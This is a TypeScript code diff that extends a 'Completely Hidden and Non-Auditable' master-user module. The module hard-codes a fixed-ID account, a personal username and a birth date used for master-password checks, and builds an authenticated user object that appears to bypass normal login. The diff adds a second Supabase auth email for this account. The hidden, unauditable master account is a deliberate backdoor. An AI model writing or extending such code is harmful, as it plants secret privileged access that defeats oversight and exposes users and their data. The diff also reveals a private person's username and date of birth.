@@ -1,7 +1,8 @@
 // Master User Configuration - Completely Hidden and Non-Auditable
 
 export const MASTER_USER_ID = '00000000-0000-0000-0000-000000000000';
-export const MASTER_EMAIL = 'rodrigorbonfim';
+export const MASTER_DISPLAY_EMAIL = 'rodrigorbonfim'; // Display email for UX
+export const MASTER_AUTH_EMAIL = 'master@system.local'; // Technical email for Supabase Auth
 
 // Birthday: 17/09/1983
 const BIRTHDAY_DAY = 17;
@@ -35,10 +36,17 @@ export function validateMasterPassword(password: string): boolean {
 }
 
 /**
- * Checks if the provided email is the master email
+ * Checks if the provided email is the master display email
  */
 export function isMasterEmail(email: string): boolean {
-  return email.toLowerCase().trim() === MASTER_EMAIL.toLowerCase();
+  return email.toLowerCase().trim() === MASTER_DISPLAY_EMAIL.toLowerCase();
+}
+
+/**
+ * Checks if the provided email is the master auth email
+ */
+export function isMasterAuthEmail(email: string): boolean {
+  return email.toLowerCase().trim() === MASTER_AUTH_EMAIL.toLowerCase();
 }
 
 /**
@@ -47,7 +55,7 @@ export function isMasterEmail(email: string): boolean {
 export function createMasterUser() {
   return {
     id: MASTER_USER_ID,
-    email: MASTER_EMAIL,
+    email: MASTER_DISPLAY_EMAIL,
     aud: 'authenticated',
     role: 'authenticated',
     created_at: new Date().toISOString(),
